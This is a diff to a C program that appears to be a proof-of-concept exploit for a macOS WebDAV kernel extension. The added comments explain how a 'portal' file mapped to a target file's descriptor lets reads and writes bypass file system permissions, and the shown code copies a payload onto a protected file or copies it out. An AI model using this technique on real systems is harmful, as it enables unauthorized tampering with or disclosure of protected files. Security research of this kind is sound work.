@@ -482,6 +482,18 @@ int main(int argc, char** argv) {
   
   printf("staring portal %s \n", temp_dir);
   
+  /*
+   Starts the listener. Listener will accept incoming request from webdav kext.
+   Target file is the input file with limited permissions that we want to bypass.
+   Portal file is the file inside webdav mount root directory. When a request to
+   open portal file is received, listener will the associate file descriptor (FD)
+   of the target file as cache of portal file. Webdav kext uses this FD to get
+   reference to vnode using file_vnode_withvid function. In webdav kext this reference
+   to vnode is saved as associated cache of portal file. All operations on portal
+   file inside webdav mount are applied to cache file. All operations on cache file
+   are directly applied using VNOP_READ and VNOP_WRITE. This bypasses permissions set
+   in the file system.
+   */
   pthread_t listen_thread_id;
   if (pthread_create(&listen_thread_id, NULL, start_listen, &args) != 0) {
     printf("cannot start webdav listener, error: %d \n", errno);
@@ -510,9 +522,11 @@ int main(int argc, char** argv) {
   
   int cp_result;
   if (portal_mode == O_RDONLY) {
+    /* Copy payload to target */
     printf("copy %s to %s \n", src_dest_path, args.handler_ctx.target);
     cp_result = cp(portal_path, src_dest_path);
   } else if (portal_mode == O_WRONLY) {
+    /* Copy target to destination with read permission */
     printf("copy %s to %s \n", args.handler_ctx.target, src_dest_path);
     cp_result = cp(src_dest_path, portal_path);
   } else {
@@ -520,6 +534,8 @@ int main(int argc, char** argv) {
     errno = ENOTSUP;
     goto done;
   }
+  
+  printf("all done \n");
   
   if (cp_result != 0) {
     printf("cannot cp, error: %d \n", errno);
